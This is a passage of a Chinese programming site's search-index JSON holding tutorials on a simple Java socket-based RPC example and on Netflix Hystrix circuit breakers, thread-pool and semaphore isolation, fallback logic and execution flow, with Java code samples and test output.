Procedure Call)远程过程调用，简单的理解是一个节点请求另一个节点提供的服务。它的工作流程是这样的：\n 执行客户端调用语句，传送参数 调用本地系统发送网络消息 消息传送到远程主机 服务器得到消息并取得参数 根据调用请求以及参数执行远程过程（服务） 执行过程完毕，将结果返回服务器句柄 服务器句柄返回结果，调用远程主机的系统网络服务发送结果 消息传回本地主机 客户端句柄由本地主机的网络服务接收消息 客户端接收到调用语句返回的结果数据  举个例子。\n首先需要一个服务端：\nimport java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Method; import java.net.InetSocketAddress; import java.net.ServerSocket; import java.net.Socket; import java.util.concurrent.ConcurrentHashMap; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; /** * RPC 服务端用来注册远程方法的接口和实现类 */ public class RPCServer { private static ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); private static final ConcurrentHashMap\u0026lt;String, Class\u0026gt; serviceRegister = new ConcurrentHashMap\u0026lt;\u0026gt;(); /** * 注册方法 * @param service * @param impl */ public void register(Class service, Class impl) { serviceRegister.put(service.getSimpleName(), impl); } /** * 启动方法 * @param port */ public void start(int port) { ServerSocket socket = null; try { socket = new ServerSocket(); socket.bind(new InetSocketAddress(port)); System.out.println(\u0026#34;服务启动\u0026#34;); System.out.println(serviceRegister); while (true) { executor.execute(new Task(socket.accept())); } } catch (Exception e) { e.printStackTrace(); } finally { if (socket != null) { try { socket.close(); } catch (IOException e) { e.printStackTrace(); } } } } private static class Task implements Runnable { Socket client = null; public Task(Socket client) { this.client = client; } @Override public void run() { ObjectInputStream input = null; ObjectOutputStream output = null; try { input = new ObjectInputStream(client.getInputStream()); // 按照顺序读取对方写过来的内容  String serviceName = input.readUTF(); String methodName = input.readUTF(); Class\u0026lt;?\u0026gt;[] parameterTypes = (Class\u0026lt;?\u0026gt;[]) input.readObject(); Object[] arguments = (Object[]) input.readObject(); Class serviceClass = serviceRegister.get(serviceName); if (serviceClass == null) { throw new ClassNotFoundException(serviceName + \u0026#34; 没有找到!\u0026#34;); } Method method = serviceClass.getMethod(methodName, parameterTypes); Object result = method.invoke(serviceClass.newInstance(), arguments); output = new ObjectOutputStream(client.getOutputStream()); output.writeObject(result); } catch (Exception e) { e.printStackTrace(); } finally { try { // 这里就不写 output!=null才关闭这个逻辑了  output.close(); input.close(); client.close(); } catch (IOException e) { e.printStackTrace(); } } } } } 其次需要一个客户端：\nimport java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.net.InetSocketAddress; import java.net.Socket; /** * RPC 客户端 */ public class RPCclient\u0026lt;T\u0026gt; { /** * 通过动态代理将参数发送过去到 RPCServer ,RPCserver 返回结果这个方法处理成为正确的实体 */ public static \u0026lt;T\u0026gt; T getRemoteProxyObj(final Class\u0026lt;T\u0026gt; service, final InetSocketAddress addr) { return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class\u0026lt;?\u0026gt;[]{service}, new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { Socket socket = null; ObjectOutputStream out = null; ObjectInputStream input = null; try { socket = new Socket(); socket.connect(addr); // 将实体类,参数,发送给远程调用方  out = new ObjectOutputStream(socket.getOutputStream()); out.writeUTF(service.getSimpleName()); out.writeUTF(method.getName()); out.writeObject(method.getParameterTypes()); out.writeObject(args); input = new ObjectInputStream(socket.getInputStream()); return input.readObject(); } catch (Exception e) { e.printStackTrace(); } finally { out.close(); input.close(); socket.close(); } return null; } }); } } 再来一个测试的远程方法。\npublic interface Tinterface { String send(String msg); } public class TinterfaceImpl implements Tinterface { @Override public String send(String msg) { return \u0026#34;send message \u0026#34; + msg; } } 测试代码如下：\nimport com.huifer.admin.rpc.Tinterface; import com.huifer.admin.rpc.TinterfaceImpl; import java.net.InetSocketAddress; public class RunTest { public static void main(String[] args) { new Thread(new Runnable() { @Override public void run() { RPCServer rpcServer = new RPCServer(); rpcServer.register(Tinterface.class, TinterfaceImpl.class); rpcServer.start(10000); } }).start(); Tinterface tinterface = RPCclient.getRemoteProxyObj(Tinterface.class, new InetSocketAddress(\u0026#34;localhost\u0026#34;, 10000)); System.out.println(tinterface.send(\u0026#34;rpc 测试用例\u0026#34;)); } } 输出 send message rpc 测试用例 。\n异步    消息中间件    常见的消息中间件有 Kafka、ActiveMQ、RabbitMQ、RocketMQ ，常见的协议有 AMQP、MQTTP、STOMP、XMPP。这里不对消息队列进行拓展了，具体如何使用还是请移步官网。\n"},{"id":197,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-circuit-breaker/","title":"hystrix-circuit-breaker","parent":"高可用","content":"深入 Hystrix 断路器执行原理    状态机    Hystrix 断路器有三种状态，分别是关闭（Closed）、打开（Open）与半开（Half-Open），三种状态转化关系如下：\n Closed 断路器关闭：调用下游的请求正常通过 Open 断路器打开：阻断对下游服务的调用，直接走 Fallback 逻辑 Half-Open 断路器处于半开状态：SleepWindowInMilliseconds  Enabled    HystrixCommandProperties.Setter() .withCircuitBreakerEnabled(boolean) 控制断路器是否工作，包括跟踪依赖服务调用的健康状况，以及对异常情况过多时是否允许触发断路。默认值 true。\ncircuitBreaker.requestVolumeThreshold    HystrixCommandProperties.Setter() .withCircuitBreakerRequestVolumeThreshold(int) 表示在一次统计的时间滑动窗口中（这个参数也很重要，下面有说到），至少经过多少个请求，才可能触发断路，默认值 20。**经过 Hystrix 断路器的流量只有在超过了一定阈值后，才有可能触发断路。**比如说，要求在 10s 内经过断路器的流量必须达到 20 个，而实际经过断路器的请求有 19 个，即使这 19 个请求全都失败，也不会去判断要不要断路。\ncircuitBreaker.errorThresholdPercentage    HystrixCommandProperties.Setter() .withCircuitBreakerErrorThresholdPercentage(int) 表示异常比例达到多少，才会触发断路，默认值是 50(%)。\ncircuitBreaker.sleepWindowInMilliseconds    HystrixCommandProperties.Setter() .withCircuitBreakerSleepWindowInMilliseconds(int) 断路器状态由 Close 转换到 Open，在之后 SleepWindowInMilliseconds 时间内，所有经过该断路器的请求会被断路，不调用后端服务，直接走 Fallback 降级机制，默认值 5000(ms)。\n而在该参数时间过后，断路器会变为 Half-Open 半开闭状态，尝试让一条请求经过断路器，看能不能正常调用。如果调用成功了，那么就自动恢复，断路器转为 Close 状态。\nForceOpen    HystrixCommandProperties.Setter() .withCircuitBreakerForceOpen(boolean) 如果设置为 true 的话，直接强迫打开断路器，相当于是手动断路了，手动降级，默认值是 false。\nForceClosed    HystrixCommandProperties.Setter() .withCircuitBreakerForceClosed(boolean) 如果设置为 true，直接强迫关闭断路器，相当于手动停止断路了，手动升级，默认值是 false。\nMetrics 统计器    与 Hystrix 断路器紧密协作的，还有另一个重要组件 —— 统计器（Metrics）。统计器中最重要的参数要数滑动窗口（metrics.rollingStats.timeInMilliseconds）以及桶（metrics.rollingStats.numBuckets）了，这里引用一段博文来解释滑动窗口（默认值是 10000 ms）：\n 一位乘客坐在正在行驶的列车的靠窗座位上，列车行驶的公路两侧种着一排挺拔的白杨树，随着列车的前进，路边的白杨树迅速从窗口滑过。我们用每棵树来代表一个请求，用列车的行驶代表时间的流逝，那么，列车上的这个窗口就是一个典型的滑动窗口，这个乘客能通过窗口看到的白杨树就是 Hystrix 要统计的数据。\n Hystrix 并不是只要有一条请求经过就去统计，而是将整个滑动窗口均分为 numBuckets 份，时间每经过一份就去统计一次。在经过一个时间窗口后，才会判断断路器状态要不要开启，请看下面的例子。\n实例 Demo    HystrixCommand 配置参数    在 GetProductInfoCommand 中配置 Setter 断路器相关参数。\n 滑动窗口中，最少 20 个请求，才可能触发断路。 异常比例达到 40% 时，才触发断路。 断路后 3000ms 内，所有请求都被 reject，直接走 fallback 降级，不会调用 run() 方法。3000ms 过后，变为 half-open 状态。  run() 方法中，我们判断一下 productId 是否为 -1，是的话，直接抛出异常。这么写，我们之后测试的时候就可以传入 productId=-1，模拟服务执行异常了。\n在降级逻辑中，我们直接给它返回降级商品就好了。\npublic class GetProductInfoCommand extends HystrixCommand\u0026lt;ProductInfo\u0026gt; { private Long productId; private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey(\u0026#34;GetProductInfoCommand\u0026#34;); public GetProductInfoCommand(Long productId) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ProductInfoService\u0026#34;)) .andCommandKey(KEY) .andCommandPropertiesDefaults(HystrixCommandProperties.Setter() // 是否允许断路器工作  .withCircuitBreakerEnabled(true) // 滑动窗口中，最少有多少个请求，才可能触发断路  .withCircuitBreakerRequestVolumeThreshold(20) // 异常比例达到多少，才触发断路，默认50%  .withCircuitBreakerErrorThresholdPercentage(40) // 断路后多少时间内直接reject请求，之后进入half-open状态，默认5000ms  .withCircuitBreakerSleepWindowInMilliseconds(3000))); this.productId = productId; } @Override protected ProductInfo run() throws Exception { System.out.println(\u0026#34;调用接口查询商品数据，productId=\u0026#34; + productId); if (productId == -1L) { throw new Exception(); } String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; String response = HttpClientUtils.sendGetRequest(url); return JSONObject.parseObject(response, ProductInfo.class); } @Override protected ProductInfo getFallback() { ProductInfo productInfo = new ProductInfo(); productInfo.setName(\u0026#34;降级商品\u0026#34;); return productInfo; } } 断路测试类    我们在测试类中，前 30 次请求，传入 productId=-1，然后休眠 3s，之后 70 次请求，传入 productId=1。\n@SpringBootTest @RunWith(SpringRunner.class) public class CircuitBreakerTest { @Test public void testCircuitBreaker() { String baseURL = \u0026#34;http://localhost:8080/getProductInfo?productId=\u0026#34;; for (int i = 0; i \u0026lt; 30; ++i) { // 传入-1，会抛出异常，然后走降级逻辑  HttpClientUtils.sendGetRequest(baseURL + \u0026#34;-1\u0026#34;); } TimeUtils.sleep(3); System.out.println(\u0026#34;After sleeping...\u0026#34;); for (int i = 31; i \u0026lt; 100; ++i) { // 传入1，走服务正常调用  HttpClientUtils.sendGetRequest(baseURL + \u0026#34;1\u0026#34;); } } } 测试结果    测试结果，我们可以明显看出系统断路与恢复的整个过程。\n调用接口查询商品数据，productId=-1 ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) // ... // 这里重复打印了 20 次上面的结果  ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) // ... // 这里重复打印了 8 次上面的结果  // 休眠 3s 后 调用接口查询商品数据，productId=1 ProductInfo(id=1, name=iphone7手机, price=5599.0, pictureList=a.jpg,b.jpg, specification=iphone7的规格, service=iphone7的售后服务, color=红色,白色,黑色, size=5.5, shopId=1, modifiedTime=2017-01-01 12:00:00, cityId=1, cityName=null, brandId=1, brandName=null) // ... // 这里重复打印了 69 次上面的结果 前 30 次请求，我们传入的 productId 为 -1，所以服务执行过程中会抛出异常。我们设置了最少 20 次请求通过断路器并且异常比例超出 40% 就触发断路。因此执行了 21 次接口调用，每次都抛异常并且走降级，21 次过后，断路器就被打开了。\n之后的 9 次请求，都不会执行 run() 方法，也就不会打印以下信息。\n调用接口查询商品数据，productId=-1 而是直接走降级逻辑，调用 getFallback() 执行。\n休眠了 3s 后，我们在之后的 70 次请求中，都传入 productId 为 1。由于我们前面设置了 3000ms 过后断路器变为 half-open 状态。因此 Hystrix 会尝试执行请求，发现成功了，那么断路器关闭，之后的所有请求也都能正常调用了。\n参考内容     Hystrix issue 1459 Hystrix Metrics  "},{"id":198,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-execution-isolation/","title":"hystrix-execution-isolation","parent":"高可用","content":"Hystrix 隔离策略细粒度控制    Hystrix 实现资源隔离，有两种策略：\n 线程池隔离 信号量隔离  对资源隔离这一块东西，其实可以做一定细粒度的一些控制。\nexecution.isolation.strategy    指定了 HystrixCommand.run() 的资源隔离策略：THREAD or SEMAPHORE，一种基于线程池，一种基于信号量。\n// to use thread isolation HystrixCommandProperties.Setter().withExecutionIsolationStrategy(ExecutionIsolationStrategy.THREAD) // to use semaphore isolation HystrixCommandProperties.Setter().withExecutionIsolationStrategy(ExecutionIsolationStrategy.SEMAPHORE) 线程池机制，每个 command 运行在一个线程中，限流是通过线程池的大小来控制的；信号量机制，command 是运行在调用线程中（也就是 Tomcat 的线程池），通过信号量的容量来进行限流。\n如何在线程池和信号量之间做选择？\n默认的策略就是线程池。\n线程池其实最大的好处就是对于网络访问请求，如果有超时的话，可以避免调用线程阻塞住。\n而使用信号量的场景，通常是针对超大并发量的场景下，每个服务实例每秒都几百的 QPS，那么此时你用线程池的话，线程一般不会太多，可能撑不住那么高的并发，如果要撑住，可能要耗费大量的线程资源，那么就是用信号量，来进行限流保护。一般用信号量常见于那种基于纯内存的一些业务逻辑服务，而不涉及到任何网络访问请求。\ncommand key \u0026amp; command group    我们使用线程池隔离，要怎么对依赖服务、依赖服务接口、线程池三者做划分呢？\n每一个 command，都可以设置一个自己的名称 command key，同时可以设置一个自己的组 command group。\nprivate static final Setter cachedSetter = Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ExampleGroup\u0026#34;)) .andCommandKey(HystrixCommandKey.Factory.asKey(\u0026#34;HelloWorld\u0026#34;)); public CommandHelloWorld(String name) { super(cachedSetter); this.name = name; } command group 是一个非常重要的概念，默认情况下，就是通过 command group 来定义一个线程池的，而且还会通过 command group 来聚合一些监控和报警信息。同一个 command group 中的请求，都会进入同一个线程池中。\ncommand thread pool    ThreadPoolKey 代表了一个 HystrixThreadPool，用来进行统一监控、统计、缓存。默认的 ThreadPoolKey 就是 command group 的名称。每个 command 都会跟它的 ThreadPoolKey 对应的 ThreadPool 绑定在一起。\n如果不想直接用 command group，也可以手动设置 ThreadPool 的名称。\nprivate static final Setter cachedSetter = Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ExampleGroup\u0026#34;)) .andCommandKey(HystrixCommandKey.Factory.asKey(\u0026#34;HelloWorld\u0026#34;)) .andThreadPoolKey(HystrixThreadPoolKey.Factory.asKey(\u0026#34;HelloWorldPool\u0026#34;)); public CommandHelloWorld(String name) { super(cachedSetter); this.name = name; } command key \u0026amp; command group \u0026amp; command thread pool    command key ，代表了一类 command，一般来说，代表了下游依赖服务的某个接口。\ncommand group ，代表了某一个下游依赖服务，这是很合理的，一个依赖服务可能会暴露出来多个接口，每个接口就是一个 command key。command group 在逻辑上对一堆 command key 的调用次数、成功次数、timeout 次数、失败次数等进行统计，可以看到某一个服务整体的一些访问情况。一般来说，推荐根据一个服务区划分出一个线程池，command key 默认都是属于同一个线程池的。\n比如说有一个服务 A，你估算出来服务 A 每秒所有接口加起来的整体 QPS 在 100 左右，你有一个服务 B 去调用服务 A。你的服务 B 部署了 10 个实例，每个实例上，用 command group 去对应下游服务 A。给一个线程池，量大概是 10 就可以了，这样服务 B 对服务 A 整体的访问 QPS 就大概是每秒 100 了。\n但是，如果说 command group 对应了一个服务，而这个服务暴露出来的几个接口，访问量很不一样，差异非常之大。你可能就希望在这个服务对应 command group 的内部，包含对应多个接口的 command key，做一些细粒度的资源隔离。就是说，希望对同一个服务的不同接口，使用不同的线程池。\ncommand key -\u0026gt; command group command key -\u0026gt; 自己的 thread pool key 逻辑上来说，多个 command key 属于一个 command group，在做统计的时候，会放在一起统计。每个 command key 有自己的线程池，每个接口有自己的线程池，去做资源隔离和限流。\n说白点，就是说如果你的 command key 要用自己的线程池，可以定义自己的 thread pool key，就 ok 了。\ncoreSize    设置线程池的大小，默认是 10。一般来说，用这个默认的 10 个线程大小就够了。\nHystrixThreadPoolProperties.Setter().withCoreSize(int value); queueSizeRejectionThreshold    如果说线程池中的 10 个线程都在工作中，没有空闲的线程来做其它的事情，此时再有请求过来，会先进入队列积压。如果说队列积压满了，再有请求过来，就直接 reject，拒绝请求，执行 fallback 降级的逻辑，快速返回。\n控制 queue 满了之后 reject 的 threshold，因为 maxQueueSize 不允许热修改，因此提供这个参数可以热修改，控制队列的最大大小。\nHystrixThreadPoolProperties.Setter().withQueueSizeRejectionThreshold(int value); execution.isolation.semaphore.maxConcurrentRequests    设置使用 SEMAPHORE 隔离策略的时候允许访问的最大并发量，超过这个最大并发量，请求直接被 reject。\n这个并发量的设置，跟线程池大小的设置，应该是类似的，但是基于信号量的话，性能会好很多，而且 Hystrix 框架本身的开销会小很多。\n默认值是 10，尽量设置的小一些，因为一旦设置的太大，而且有延时发生，可能瞬间导致 tomcat 本身的线程资源被占满。\nHystrixCommandProperties.Setter().withExecutionIsolationSemaphoreMaxConcurrentRequests(int value); "},{"id":199,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-fallback/","title":"hystrix-fallback","parent":"高可用","content":"基于本地缓存的 fallback 降级机制    Hystrix 出现以下四种情况，都会去调用 fallback 降级机制：\n 断路器处于打开的状态。 资源池已满（线程池+队列 / 信号量）。 Hystrix 调用各种接口，或者访问外部依赖，比如 MySQL、Redis、Zookeeper、Kafka 等等，出现了任何异常的情况。 访问外部依赖的时候，访问时间过长，报了 TimeoutException 异常。  两种最经典的降级机制      纯内存数据\n在降级逻辑中，你可以在内存中维护一个 ehcache，作为一个纯内存的基于 LRU 自动清理的缓存，让数据放在缓存内。如果说外部依赖有异常，fallback 这里直接尝试从 ehcache 中获取数据。\n  默认值\nfallback 降级逻辑中，也可以直接返回一个默认值。\n  在 HystrixCommand，降级逻辑的书写，是通过实现 getFallback() 接口；而在 HystrixObservableCommand 中，则是实现 resumeWithFallback() 方法。\n现在，我们用一个简单的栗子，来演示 fallback 降级是怎么做的。\n比如，有这么个场景。我们现在有个包含 brandId 的商品数据，假设正常的逻辑是这样：拿到一个商品数据，根据 brandId 去调用品牌服务的接口，获取品牌的最新名称 brandName。\n假如说，品牌服务接口挂掉了，那么我们可以尝试从本地内存中，获取一份稍过期的数据，先凑合着用。\n步骤一：本地缓存获取数据    本地获取品牌名称的代码大致如下。\n/** * 品牌名称本地缓存 * */ public class BrandCache { private static Map\u0026lt;Long, String\u0026gt; brandMap = new HashMap\u0026lt;\u0026gt;(); static { brandMap.put(1L, \u0026#34;Nike\u0026#34;); } /** * brandId 获取 brandName * * @param brandId 品牌id * @return 品牌名 */ public static String getBrandName(Long brandId) { return brandMap.get(brandId); } 步骤二：实现 GetBrandNameCommand    在 GetBrandNameCommand 中，run() 方法的正常逻辑是去调用品牌服务的接口获取到品牌名称，如果调用失败，报错了，那么就会去调用 fallback 降级机制。\n这里，我们直接模拟接口调用报错，给它抛出个异常。\n而在 getFallback() 方法中，就是我们的降级逻辑，我们直接从本地的缓存中，获取到品牌名称的数据。\n/** * 获取品牌名称的command * */ public class GetBrandNameCommand extends HystrixCommand\u0026lt;String\u0026gt; { private Long brandId; public GetBrandNameCommand(Long brandId) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;BrandService\u0026#34;)) .andCommandKey(HystrixCommandKey.Factory.asKey(\u0026#34;GetBrandNameCommand\u0026#34;)) .andCommandPropertiesDefaults(HystrixCommandProperties.Setter() // 设置降级机制最大并发请求数  .withFallbackIsolationSemaphoreMaxConcurrentRequests(15))); this.brandId = brandId; } @Override protected String run() throws Exception { // 这里正常的逻辑应该是去调用一个品牌服务的接口获取名称  // 如果调用失败，报错了，那么就会去调用fallback降级机制  // 这里我们直接模拟调用报错，抛出异常  throw new Exception(); } @Override protected String getFallback() { return BrandCache.getBrandName(brandId); } } FallbackIsolationSemaphoreMaxConcurrentRequests 用于设置 fallback 最大允许的并发请求量，默认值是 10，是通过 semaphore 信号量的机制去限流的。如果超出了这个最大值，那么直接 reject。\n步骤三：CacheController 调用接口    在 CacheController 中，我们通过 productInfo 获取 brandId，然后创建 GetBrandNameCommand 并执行，去尝试获取 brandName。这里执行会报错，因为我们在 run() 方法中直接抛出异常，Hystrix 就会去调用 getFallback() 方法走降级逻辑。\n@Controller public class CacheController { @RequestMapping(\u0026#34;/getProductInfo\u0026#34;) @ResponseBody public String getProductInfo(Long productId) { HystrixCommand\u0026lt;ProductInfo\u0026gt; getProductInfoCommand = new GetProductInfoCommand(productId); ProductInfo productInfo = getProductInfoCommand.execute(); Long brandId = productInfo.getBrandId(); HystrixCommand\u0026lt;String\u0026gt; getBrandNameCommand = new GetBrandNameCommand(brandId); // 执行会抛异常报错，然后走降级  String brandName = getBrandNameCommand.execute(); productInfo.setBrandName(brandName); System.out.println(productInfo); return \u0026#34;success\u0026#34;; } } 关于降级逻辑的演示，基本上就结束了。\n"},{"id":200,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-introduction/","title":"hystrix-introduction","parent":"高可用","content":"用 Hystrix 构建高可用服务架构    参考 Hystrix Home。\nHystrix 是什么？    在分布式系统中，每个服务都可能会调用很多其他服务，被调用的那些服务就是依赖服务，有的时候某些依赖服务出现故障也是很正常的。\nHystrix 可以让我们在分布式系统中对服务间的调用进行控制，加入一些调用延迟或者依赖故障的容错机制。\nHystrix 通过将依赖服务进行资源隔离，进而阻止某个依赖服务出现故障时在整个系统所有的依赖服务调用中进行蔓延；同时 Hystrix 还提供故障时的 fallback 降级机制。\n总而言之，Hystrix 通过这些方法帮助我们提升分布式系统的可用性和稳定性。\nHystrix 的历史    Hystrix 是高可用性保障的一个框架。Netflix（可以认为是国外的优酷或者爱奇艺之类的视频网站）的 API 团队从 2011 年开始做一些提升系统可用性和稳定性的工作，Hystrix 就是从那时候开始发展出来的。\n在 2012 年的时候，Hystrix 就变得比较成熟和稳定了，Netflix 中，除了 API 团队以外，很多其他的团队都开始使用 Hystrix。\n时至今日，Netflix 中每天都有数十亿次的服务间调用，通过 Hystrix 框架在进行，而 Hystrix 也帮助 Netflix 网站提升了整体的可用性和稳定性。\n2018 年 11 月，Hystrix 在其 Github 主页宣布，不再开放新功能，推荐开发者使用其他仍然活跃的开源项目。维护模式的转变绝不意味着 Hystrix 不再有价值。相反，Hystrix 激发了很多伟大的想法和项目，我们高可用的这一块知识还是会针对 Hystrix 进行讲解。\nHystrix 的设计原则     对依赖服务调用时出现的调用延迟和调用失败进行控制和容错保护。 在复杂的分布式系统中，阻止某一个依赖服务的故障在整个系统中蔓延。比如某一个服务故障了，导致其它服务也跟着故障。 提供 fail-fast（快速失败）和快速恢复的支持。 提供 fallback 优雅降级的支持。 支持近实时的监控、报警以及运维操作。  举个栗子。\n有这样一个分布式系统，服务 A 依赖于服务 B，服务 B 依赖于服务 C/D/E。在这样一个成熟的系统内，比如说最多可能只有 100 个线程资源。正常情况下，40 个线程并发调用服务 C，各 30 个线程并发调用 D/E。\n调用服务 C，只需要 20ms，现在因为服务 C 故障了，比如延迟，或者挂了，此时线程会 hang 住 2s 左右。40 个线程全部被卡住，由于请求不断涌入，其它的线程也用来调用服务 C，同样也会被卡住。这样导致服务 B 的线程资源被耗尽，无法接收新的请求，甚至可能因为大量线程不断的运转，导致自己宕机。这种影响势必会蔓延至服务 A，导致服务 A 也跟着挂掉。\nHystrix 可以对其进行资源隔离，比如限制服务 B 只有 40 个线程调用服务 C。当此 40 个线程被 hang 住时，其它 60 个线程依然能正常调用工作。从而确保整个系统不会被拖垮。\nHystrix 更加细节的设计原则     阻止任何一个依赖服务耗尽所有的资源，比如 tomcat 中的所有线程资源。 避免请求排队和积压，采用限流和 fail fast 来控制故障。 提供 fallback 降级机制来应对故障。 使用资源隔离技术，比如 bulkhead（舱壁隔离技术）、swimlane（泳道技术）、circuit breaker（断路技术）来限制任何一个依赖服务的故障的影响。 通过近实时的统计/监控/报警功能，来提高故障发现的速度。 通过近实时的属性和配置热修改功能，来提高故障处理和恢复的速度。 保护依赖服务调用的所有故障情况，而不仅仅只是网络故障情况。  "},{"id":201,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-process/","title":"hystrix-process","parent":"高可用","content":"深入 Hystrix 执行时内部原理    前面我们了解了 Hystrix 最基本的支持高可用的技术：资源隔离 + 限流。\n 创建 command； 执行这个 command； 配置这个 command 对应的 group 和线程池。  这里，我们要讲一下，你开始执行这个 command，调用了这个 command 的 execute() 方法之后，Hystrix 底层的执行流程和步骤以及原理是什么。\n在讲解这个流程的过程中，我会带出来 Hystrix 其他的一些核心以及重要的功能。\n这里是整个 8 大步骤的流程图，我会对每个步骤进行细致的讲解。学习的过程中，对照着这个流程图，相信思路会比较清晰。\n步骤一：创建 command    一个 HystrixCommand 或 HystrixObservableCommand 对象，代表了对某个依赖服务发起的一次请求或者调用。创建的时候，可以在构造函数中传入任何需要的参数。\n HystrixCommand 主要用于仅仅会返回一个结果的调用。 HystrixObservableCommand 主要用于可能会返回多条结果的调用。  // 创建 HystrixCommand HystrixCommand hystrixCommand = new HystrixCommand(arg1, arg2); // 创建 HystrixObservableCommand HystrixObservableCommand hystrixObservableCommand = new HystrixObservableCommand(arg1, arg2); 步骤二：调用 command 执行方法    执行 command，就可以发起一次对依赖服务的调用。\n要执行 command，可以在 4 个方法中选择其中的一个：execute()、queue()、observe()、toObservable()。\n其中 execute() 和 queue() 方法仅仅对 HystrixCommand 适用。\n execute()：调用后直接 block 住，属于同步调用，直到依赖服务返回单条结果，或者抛出异常。 queue()：返回一个 Future，属于异步调用，后面可以通过 Future 获取单条结果。 observe()：订阅一个 Observable 对象，Observable 代表的是依赖服务返回的结果，获取到一个那个代表结果的 Observable 对象的拷贝对象。 toObservable()：返回一个 Observable 对象，如果我们订阅这个对象，就会执行 command 并且获取返回结果。  K value = hystrixCommand.execute(); Future\u0026lt;K\u0026gt; fValue = hystrixCommand.queue(); Observable\u0026lt;K\u0026gt; oValue = hystrixObservableCommand.observe(); Observable\u0026lt;K\u0026gt; toOValue = hystrixObservableCommand.toObservable(); execute() 实际上会调用 queue().get() 方法，可以看一下 Hystrix 源码。\npublic R execute() { try { return queue().get(); } catch (Exception e) { throw Exceptions.sneakyThrow(decomposeException(e)); } } 而在 queue() 方法中，会调用 toObservable().toBlocking().toFuture()。\nfinal Future\u0026lt;R\u0026gt; delegate = toObservable().toBlocking().toFuture(); 也就是说，先通过 toObservable() 获得 Future 对象，然后调用 Future 的 get() 方法。那么，其实无论是哪种方式执行 command，最终都是依赖于 toObservable() 去执行的。\n步骤三：检查是否开启缓存（不太常用）    从这一步开始，就进入到 Hystrix 底层运行原理啦，看一下 Hystrix 一些更高级的功能和特性。\n如果这个 command 开启了请求缓存 Request Cache，而且这个调用的结果在缓存中存在，那么直接从缓存中返回结果。否则，继续往后的步骤。\n步骤四：检查是否开启了断路器    检查这个 command 对应的依赖服务是否开启了断路器。如果断路器被打开了，那么 Hystrix 就不会执行这个 command，而是直接去执行 fallback 降级机制，返回降级结果。\n步骤五：检查线程池/队列/信号量是否已满    如果这个 command 线程池和队列已满，或者 semaphore 信号量已满，那么也不会执行 command，而是直接去调用 fallback 降级机制，同时发送 reject 信息给断路器统计。\n步骤六：执行 command    调用 HystrixObservableCommand 对象的 construct() 方法，或者 HystrixCommand 的 run() 方法来实际执行这个 command。\n HystrixCommand.run() 返回单条结果，或者抛出异常。  // 通过command执行，获取最新一条商品数据 ProductInfo productInfo = getProductInfoCommand.execute();  HystrixObservableCommand.construct() 返回一个 Observable 对象，可以获取多条结果。  Observable\u0026lt;ProductInfo\u0026gt; observable = getProductInfosCommand.observe(); // 订阅获取多条结果 observable.subscribe(new Observer\u0026lt;ProductInfo\u0026gt;() { @Override public void onCompleted() { System.out.println(\u0026#34;获取完了所有的商品数据\u0026#34;); } @Override public void onError(Throwable e) { e.printStackTrace(); } /** * 获取完一条数据，就回调一次这个方法 * * @param productInfo 商品信息 */ @Override public void onNext(ProductInfo productInfo) { System.out.println(productInfo); } }); 如果是采用线程池方式，并且 HystrixCommand.run() 或者 HystrixObservableCommand.construct() 的执行时间超过了 timeout 时长的话，那么 command 所在的线程会抛出一个 TimeoutException，这时会执行 fallback 降级机制，不会去管 run() 或 construct() 返回的值了。另一种情况，如果 command 执行出错抛出了其它异常，那么也会走 fallback 降级。这两种情况下，Hystrix 都会发送异常事件给断路器统计。\n注意，我们是不可能终止掉一个调用严重延迟的依赖服务的线程的，只能说给你抛出来一个 TimeoutException。\n如果没有 timeout，也正常执行的话，那么调用线程就会拿到一些调用依赖服务获取到的结果，然后 Hystrix 也会做一些 logging 记录和 metric 度量统计。\n步骤七：断路健康检查    Hystrix 会把每一个依赖服务的调用成功、失败、Reject、Timeout 等事件发送给 circuit breaker 断路器。断路器就会对这些事件的次数进行统计，根据异常事件发生的比例来决定是否要进行断路（熔断）。如果打开了断路器，那么在接下来一段时间内，会直接断路，返回降级结果。\n如果在之后，断路器尝试执行 command，调用没有出错，返回了正常结果，那么 Hystrix 就会把断路器关闭。\n步骤八：调用 fallback 降级机制    在以下几种情况中，Hystrix 会调用 fallback 降级机制。\n 断路器处于打开状态； 线程池/队列/semaphore 满了； command 执行超时； run() 或者 construct() 抛出异常。  一般在降级机制中，都建议给出一些默认的返回值，比如静态的一些代码逻辑，或者从内存中的缓存中提取一些数据，在这里尽量不要再进行网络请求了。\n在降级中，如果一定要进行网络调用的话，也应该将那个调用放在一个 HystrixCommand 中进行隔离。\n HystrixCommand 中，实现 getFallback() 方法，可以提供降级机制。 HystrixObservableCommand 中，实现 resumeWithFallback() 方法，返回一个 Observable 对象，可以提供降级结果。  如果没有实现 fallback，或者 fallback 抛出了异常，Hystrix 会返回一个 Observable，但是不会返回任何数据。\n不同的 command 执行方式，其 fallback 为空或者异常时的返回结果不同。\n 对于 execute()，直接抛出异常。 对于 queue()，返回一个 Future，调用 get() 时抛出异常。 对于 observe()，返回一个 Observable 对象，但是调用 subscribe() 